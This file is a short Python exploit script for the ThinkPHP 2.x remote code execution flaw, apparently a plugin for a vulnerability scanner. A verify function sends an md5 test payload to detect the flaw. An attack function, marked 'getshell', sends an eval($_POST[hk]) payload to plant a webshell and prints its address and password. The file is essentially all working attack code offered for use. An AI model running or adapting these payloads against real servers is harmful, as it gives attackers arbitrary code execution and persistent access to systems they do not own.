import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': 'Thinkphp 2.x rce',
        'vulnerable': False,
        'attack': True,
    }
    try:
        payload = urllib.parse.urljoin(url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
        response = requests.get(payload, timeout=3)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = payload
            relsult['attack'] = True
        return relsult
    except:
        return relsult

# getshell
def attack(url):
    try:
        print('[*] 存在 Thinkphp 2.x rce!')
        payload = r'/index.php?s=a/b/c/${@print(eval($_POST[hk]))}'
        webshell = urllib.parse.urljoin(url, payload)
        if requests.get(webshell, timeout=10).status_code == 200:
            print('[+] webshell:', webshell)
            print('[+] 密码: hk')
            return True
        else:
            return False
    except:
        return False

